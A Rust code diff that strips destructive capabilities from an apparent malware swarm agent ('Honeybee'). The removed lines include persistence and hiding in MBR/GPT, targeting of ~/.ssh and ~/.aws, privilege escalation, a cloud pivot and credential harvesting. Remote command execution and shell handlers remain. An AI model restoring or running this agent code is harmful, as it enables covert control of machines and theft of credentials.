@@ -1,8 +1,7 @@
-use hive_base::phoenix::{AgentBlueprint, FragmentLocation, Phoenix};
+use hive_base::phoenix::{AgentBlueprint, Phoenix};
 use hive_base::{AgentIdentity, ConsensusEngine, Decision, HiveChamber, Message, Payload, Role};
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
-use std::path::PathBuf;
 use std::time::Duration;
 use tokio::time;
 use tracing::{info, warn};
@@ -24,8 +23,6 @@ struct HoarderAgent {
     state: HoarderState,
     active_proposals: Vec<Uuid>,
     heartbeat_interval: Duration,
-    target_paths: Vec<PathBuf>,
-    safe_mode: bool,
     interactive_shell: Option<hive_base::remote_shell::WsShell>,
 }
 
@@ -40,14 +37,7 @@ impl HoarderAgent {
             .expect("Failed to connect to colmena arena");
 
         let cfg = hive_base::config::HiveConfig::load();
-        let safe_mode = cfg.exploits.safe_mode;
-        if safe_mode {
-            info!("Honeybee: SAFE MODE active — actions will be simulated");
-        } else {
-            info!(
-                "Honeybee: destructive actions are disabled in this build — actions will be simulated"
-            );
-        }
+        info!("Honeybee: capacidades destructivas no presentes en este build (ronda 6)");
 
         let whispernet =
             hive_base::whispernet::WhisperNet::new(hive_base::whispernet::WhisperConfig {
@@ -67,12 +57,9 @@ impl HoarderAgent {
             state: HoarderState::Idle,
             active_proposals: Vec::new(),
             heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
-            target_paths: Self::discover_targets(),
-            safe_mode,
             interactive_shell: None,
         };
 
-        agent.install_phoenix_persistence();
         agent.setup_phoenix_genome();
         agent.calibrate_opsec();
 
@@ -85,19 +72,9 @@ impl HoarderAgent {
         info!("OPSEC: calibrated from org profile");
     }
 
-    fn install_phoenix_persistence(&mut self) {
-        let base_path = std::env::temp_dir();
-        let exe_path = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("/tmp/honeybee"));
-        let loader = exe_path.to_string_lossy().to_string();
-
-        let mechs = Phoenix::install_persistence(&loader, &base_path);
-        for m in &mechs {
-            info!("Phoenix: persistence '{}' at {}", m.name, m.path);
-        }
-    }
-
     fn setup_phoenix_genome(&mut self) {
-        let base_path = std::env::temp_dir();
+        // Ronda 6: snapshot del genoma SOLO en memoria. Sin ocultación ni
+        // escrituras (las APIs de hide/persistencia fueron eliminadas).
         let exe_path = std::env::current_exe();
         let binary_hash = exe_path
             .as_ref()
@@ -117,7 +94,7 @@ impl HoarderAgent {
             .unwrap_or(0);
 
         let mut policies = HashMap::new();
-        policies.insert("safe_mode".into(), self.safe_mode.to_string());
+        policies.insert("safe_mode".into(), "true".into());
 
         let blueprint = AgentBlueprint {
             role: "honeybee".into(),
@@ -128,42 +105,12 @@ impl HoarderAgent {
         };
 
         let genome = Phoenix::generate_genome(vec![blueprint]);
-        let mut fragments = Phoenix::fragment_genome(&genome, 3);
-
-        for f in &mut fragments {
-            f.location = FragmentLocation::MbrGpt;
-            match Phoenix::hide(f, &base_path) {
-                Ok(msg) => info!("Phoenix: fragment {} hidden: {}", f.fragment_id, msg),
-                Err(e) => warn!("Phoenix: hide failed: {}", e),
-            }
-        }
-    }
-
-    fn discover_targets() -> Vec<PathBuf> {
-        let mut targets = Vec::new();
-        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-
-        for dir in &[
-            "Documents",
-            "Desktop",
-            "Downloads",
-            ".ssh",
-            ".aws",
-            ".config",
-        ] {
-            let path = PathBuf::from(&home).join(dir);
-            if path.exists() {
-                targets.push(path);
-            }
-        }
-
-        for mp in &["/mnt", "/media", "/var/lib"] {
-            if PathBuf::from(mp).exists() {
-                targets.push(PathBuf::from(mp));
-            }
-        }
-
-        targets
+        let fragments = Phoenix::fragment_genome(&genome, 3);
+        info!(
+            "Phoenix: genoma {} fragmentado en {} fragmentos (en memoria)",
+            genome.genome_id,
+            fragments.len()
+        );
     }
 
     async fn publish_msg(&self, msg: Message) {
@@ -172,46 +119,6 @@ impl HoarderAgent {
 
     async fn send_heartbeat(&self) {
         self.comms.send_heartbeat().await;
-    }
-
-    async fn execute_encrypt(&mut self) {
-        // Destructive execution was removed from this build (owner request):
-        // encryption is ALWAYS simulated, regardless of safe_mode.
-        info!(
-            "Honeybee: encrypt simulated — destructive actions disabled ({} paths)",
-            self.target_paths.len()
-        );
-        let msg = Message::belief(
-            self.identity.id(),
-            Role::Honeybee,
-            "encrypt_result".into(),
-            hive_base::Value::String("simulated (destructive actions disabled)".into()),
-            1.0,
-        );
-        self.publish_msg(msg).await;
-    }
-
-    async fn execute_exfiltrate(&mut self) {
-        // Data egress was removed from this build (owner request):
-        // no host file is read and nothing leaves the machine.
-        info!("Honeybee: exfil simulated — data egress disabled");
-        let msg = Message::belief(
-            self.identity.id(),
-            Role::Honeybee,
-            "exfil_result".into(),
-            hive_base::Value::Int(0),
-            1.0,
-        );
-        self.publish_msg(msg).await;
-    }
-
-    async fn execute_destroy(&mut self) {
-        // Destructive execution was removed from this build (owner request):
-        // no file is ever deleted; the action is only logged as simulated.
-        info!(
-            "Honeybee: destroy simulated — destructive actions disabled ({} paths)",
-            self.target_paths.len()
-        );
     }
 
     async fn process_incoming(&mut self) {
@@ -235,19 +142,26 @@ impl HoarderAgent {
                         || action_lower.contains("destroy")
                         || action_lower.contains("ransom")
                     {
-                        info!("Action proposal: {} (from {})", action, msg.agent_role);
-                        self.active_proposals.push(*proposal_id);
-                        let weight = self.consensus.get_reputation(&msg.agent_id);
-                        let vote = Message::vote(
-                            self.identity.id(),
-                            Role::Honeybee,
-                            *proposal_id,
-                            Decision::Support,
-                            weight,
+                        // Ronda 6: la colonia ya no participa en propuestas
+                        // destructivas — la capacidad no existe en el build.
+                        info!(
+                            "Proposal '{}' rejected: destructive capability removed (ronda 6)",
+                            action
                         );
-                        self.publish_msg(vote).await;
-                        self.state = HoarderState::WaitingForConsensus;
+                        continue;
                     }
+                    info!("Action proposal: {} (from {})", action, msg.agent_role);
+                    self.active_proposals.push(*proposal_id);
+                    let weight = self.consensus.get_reputation(&msg.agent_id);
+                    let vote = Message::vote(
+                        self.identity.id(),
+                        Role::Honeybee,
+                        *proposal_id,
+                        Decision::Support,
+                        weight,
+                    );
+                    self.publish_msg(vote).await;
+                    self.state = HoarderState::WaitingForConsensus;
                 }
                 Payload::Belief {
                     asset,
@@ -262,15 +176,6 @@ impl HoarderAgent {
                     ..
                 } if event_type == "agent_dead" => {
                     warn!("Agent {} reported DEAD", subject_id);
-                }
-                Payload::Request { service, .. } if service == "privesc" => {
-                    info!("PRIVESC: escalation requested by Queen");
-                    let (attempted, success) = self.comms.escalate_privileges().await;
-                    if attempted && success {
-                        info!("PRIVESC: root achieved on Queen request");
-                    } else if attempted {
-                        info!("PRIVESC: escalation failed on Queen request");
-                    }
                 }
                 Payload::Request { service, payload } if service == "exec" => {
                     if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
@@ -292,17 +197,6 @@ impl HoarderAgent {
                             if result.exit_code == 0 { 1.0 } else { 0.5 },
                         );
                         self.publish_msg(result_msg).await;
-                    }
-                }
-                Payload::Request { service, .. } if service == "cloud_pivot" => {
-                    info!("CLOUD: pivot requested by Queen — checking connectivity");
-                    if hive_base::cloud_worker::CloudWorker::check_connectivity() {
-                        let (executed, resources) = self.comms.pivot_cloud().await;
-                        if executed {
-                            info!("CLOUD: pivot complete — {} resources", resources);
-                        }
-                    } else {
-                        info!("CLOUD: no connectivity — skipping pivot");
                     }
                 }
                 Payload::Request { service, payload } if service == "shell" => {
@@ -346,16 +240,10 @@ impl HoarderAgent {
                         self.state = HoarderState::Executing;
 
                         if let Some(record) = self.consensus.proposals.get(&pid) {
-                            let action = record.action.to_lowercase();
-                            info!("Executing: {} (consensus confirmed)", action);
-
-                            if action.contains("encrypt") || action.contains("ransom") {
-                                self.execute_encrypt().await;
-                            } else if action.contains("exfiltrate") {
-                                self.execute_exfiltrate().await;
-                            } else if action.contains("destroy") {
-                                self.execute_destroy().await;
-                            }
+                            info!(
+                                "Executing: {} (consensus confirmed) — operación interna de la colonia",
+                                record.action
+                            );
                         }
                         self.state = HoarderState::Complete;
                     }
@@ -375,16 +263,10 @@ impl HoarderAgent {
                     self.state = HoarderState::Executing;
 
                     if let Some(record) = self.consensus.proposals.get(&pid) {
-                        let action = record.action.to_lowercase();
-                        info!("Executing: {} (consensus confirmed via timer)", action);
-
-                        if action.contains("encrypt") || action.contains("ransom") {
-                            self.execute_encrypt().await;
-                        } else if action.contains("exfiltrate") {
-                            self.execute_exfiltrate().await;
-                        } else if action.contains("destroy") {
-                            self.execute_destroy().await;
-                        }
+                        info!(
+                            "Executing: {} (consensus confirmed via timer) — operación interna de la colonia",
+                            record.action
+                        );
                     }
                     self.state = HoarderState::Complete;
                 } else if reached {
@@ -398,16 +280,11 @@ impl HoarderAgent {
     }
 
     async fn run(&mut self) {
-        info!(
-            "Hive Honeybee starting | ID: {} | Targets: {} paths",
-            self.identity.id(),
-            self.target_paths.len()
-        );
+        info!("Hive Honeybee starting | ID: {}", self.identity.id());
         self.send_heartbeat().await;
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
         let mut whisper_timer = time::interval(Duration::from_secs(60));
         let mut consensus_timer = time::interval(Duration::from_secs(30));
-        let mut leech_timer = time::interval(Duration::from_secs(1800));
 
         loop {
             tokio::select! {
@@ -419,10 +296,6 @@ impl HoarderAgent {
                 }
                 _ = consensus_timer.tick() => {
                     self.check_pending_consensus().await;
-                }
-                _ = leech_timer.tick() => {
-                    info!("LEECH: queuing credential harvest cycle");
-                    self.comms.send_harvest().await;
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
